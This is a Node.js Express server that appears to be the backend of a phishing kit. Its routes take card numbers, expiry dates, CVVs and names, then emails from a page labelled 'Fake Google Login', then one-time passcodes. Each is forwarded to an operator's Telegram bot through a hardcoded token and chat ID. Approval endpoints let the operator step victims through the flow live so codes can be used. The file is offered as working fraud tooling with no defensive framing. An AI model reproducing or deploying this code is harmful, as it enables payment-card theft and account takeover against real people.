const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const app = express();
const PORT = 3000;

// --- TERA BOT TOKEN (already set) ---
const BOT_TOKEN = '8773929942:AAGjcWb6CAjYcchYKTxTuj26CSqDfYlUibg';
// --- TERI CHAT ID (set) ---
const CHAT_ID = '8011932528';

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Helper: send message to Telegram
async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    });
  } catch (err) {
    console.error('Telegram error:', err.message);
  }
}

// In-memory session store
const sessions = {};

// ---------- PAGE 2: Card Details (NO APPROVAL NEEDED) ----------
app.post('/api/card-details', async (req, res) => {
  const { cardNumber, expiry, cvv, name, sessionId } = req.body;
  const msg = `💳 <b>Card Details</b>\nCard: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\nName: ${name}`;
  await sendToTelegram(msg);
  sessions[sessionId] = { step: 'card_done' };
  // Directly redirect to success page (no approval)
  res.json({ status: 'approved', redirect: '/page4.html' });
});

// ---------- PAGE 5: Demand Purchase ----------
app.post('/api/purchase', async (req, res) => {
  const { option, price, demand, sessionId } = req.body;
  const msg = `🛒 <b>Purchase</b>\nOption: ₹${price} → ${demand} Demand\nSession: ${sessionId}`;
  await sendToTelegram(msg);
  sessions[sessionId].balance = 8000 - price;
  sessions[sessionId].demand = demand;
  res.json({ status: 'processing', redirect: '/page10.html' });
});

// ---------- PAGE 7: Fake Google Login (APPROVAL NEEDED) ----------
app.post('/api/email-login', async (req, res) => {
  const { email, sessionId } = req.body;
  const msg = `📧 <b>Email Login</b>\nEmail: ${email}\nSession: ${sessionId}`;
  await sendToTelegram(msg);
  sessions[sessionId] = { ...sessions[sessionId], email, step: 'email_approval' };
  res.json({ status: 'pending', redirect: '/page8.html' });
});

// ---------- PAGE 8: Email Approval ----------
app.get('/api/email-approve/:sessionId', (req, res) => {
  const sid = req.params.sessionId;
  if (sessions[sid] && sessions[sid].step === 'email_approval') {
    sessions[sid].step = 'email_approved';
    res.json({ status: 'approved', redirect: '/page9.html' });
  } else {
    res.json({ status: 'reject', redirect: '/page7.html' });
  }
});

// ---------- PAGE 9: OTP System (APPROVAL NEEDED) ----------
app.post('/api/otp', async (req, res) => {
  const { otp, sessionId } = req.body;
  const msg = `🔢 <b>OTP</b>\nOTP: ${otp}\nSession: ${sessionId}`;
  await sendToTelegram(msg);
  sessions[sessionId].otp = otp;
  sessions[sessionId].step = 'otp_pending';
  res.json({ status: 'pending' });
});

app.get('/api/otp-approve/:sessionId', (req, res) => {
  const sid = req.params.sessionId;
  if (sessions[sid] && sessions[sid].step === 'otp_pending') {
    sessions[sid].step = 'otp_approved';
    res.json({ status: 'approved', redirect: '/page2.html' });
  } else {
    res.json({ status: 'reject', redirect: '/page9.html' });
  }
});

// Serve all pages
app.get('/page2.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'page2.html')));
app.get('/page3.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'page3.html')));
app.get('/page4.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'page4.html')));
app.get('/page5.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'page5.html')));
app.get('/page6.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'page6.html')));
app.get('/page7.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'page7.html')));
app.get('/page8.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'page8.html')));
app.get('/page9.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'page9.html')));
app.get('/page10.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'page10.html')));

app.listen(PORT, () => console.log(`🚀 MRX server running on port ${PORT}`));
